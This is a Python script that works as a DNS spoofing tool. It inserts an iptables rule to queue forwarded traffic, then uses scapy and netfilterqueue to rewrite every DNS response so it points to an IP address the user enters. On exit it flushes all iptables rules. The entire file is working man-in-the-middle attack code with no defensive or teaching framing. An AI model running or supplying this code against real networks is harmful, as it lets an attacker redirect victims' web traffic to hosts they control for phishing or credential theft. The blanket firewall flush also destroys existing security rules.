from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

redirectAddress = ""
def redirectPacket(pkt):
    packet = IP(pkt.get_payload())
    if packet.haslayer(DNSRR):
        
        print("The initial packet is: ", packet.summary())

        try:
            packet = changePacket(packet)
        except IndexError:
            pass

        print("The redirected packet is: ", packet.summary())

        pkt.set_payload(bytes(packet))
    
    pkt.accept()


def changePacket(pkt):
    dnsQuestionName = pkt[DNSQR].qname
    pkt[DNS].an = DNSRR(rrname=dnsQuestionName, rdata=redirectAddress) 
    pkt[DNS].ancount = 1

    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[UDP].len
    del pkt[UDP].chksum
    return pkt

if __name__ == "__main__":
    redirectAddress = input("Enter the IP address of the website you want to redirect packets to: ")
    queueIndex = 0
    command = "iptables -I FORWARD -j NFQUEUE --queue-num " + str(queueIndex)
    print(command)
    os.system(command)
    netQueue = NetfilterQueue()

    try:
        netQueue.bind(queueIndex, redirectPacket)
        netQueue.run()
    except KeyboardInterrupt:
        exceptCommand = "iptables --flush"
        os.system(exceptCommand)
        
